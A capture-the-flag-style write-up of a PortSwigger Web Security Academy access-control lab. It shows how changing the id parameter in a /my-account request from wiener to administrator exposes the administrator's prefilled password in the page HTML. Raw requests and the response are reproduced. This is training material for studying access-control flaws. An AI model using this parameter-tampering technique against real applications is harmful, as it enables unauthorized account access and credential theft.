Lab Description:

This lab has user account page that contains the current user's existing password, prefilled in a masked input.
To solve the lab, retrieve the administrator's password, then use it to delete the user carlos.
You can log in to your own account using the following credentials: wiener:peter

When logging on the application using the wiener:peter credentials, its possible to see that the actual password of the user is displayed on the account page, 
but not totally displayed. Looks like the following:

<img width="1300" height="761" alt="image" src="https://github.com/user-attachments/assets/a209a830-2d48-4f03-b2ea-ffc050120eee" />

But the password is in clear text on the html code of the page, so using repeater i change the id parameter from wiener to administrator:

Original Request:

GET /my-account?id=wiener HTTP/2
Host: 0afb00fc04ee225e80fe449700e60016.web-security-academy.net
Cookie: session=mHHPuPmlmmzMWrHm8v9bNdv2gHMEwRIv
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0afb00fc04ee225e80fe449700e60016.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

New Request:

GET /my-account?id=administrator HTTP/2
Host: 0afb00fc04ee225e80fe449700e60016.web-security-academy.net
Cookie: session=mHHPuPmlmmzMWrHm8v9bNdv2gHMEwRIv
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="152", "Not?A_Brand";v="24", "Google Chrome";v="152"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0afb00fc04ee225e80fe449700e60016.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

The response brings on html code of the page the administrator password, in clear text:
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3939

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User ID controlled by request parameter with password disclosure</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>User ID controlled by request parameter with password disclosure</h2>
                            <a class=link-back href='https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: administrator</p>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="UMWHv8gVkqBkSBTRX6XJ1fOTDXPKVR8l">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                        <form class="login-form" action="/my-account/change-password" method="POST">
                            <br/>
                            <label>Password</label>
                            <input required type="hidden" name="csrf" value="UMWHv8gVkqBkSBTRX6XJ1fOTDXPKVR8l">
                            <input required type=password name=password value='ADMIN_PASSWD'/>
                            <button class='button' type='submit'> Update password </button>
                        </form>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>

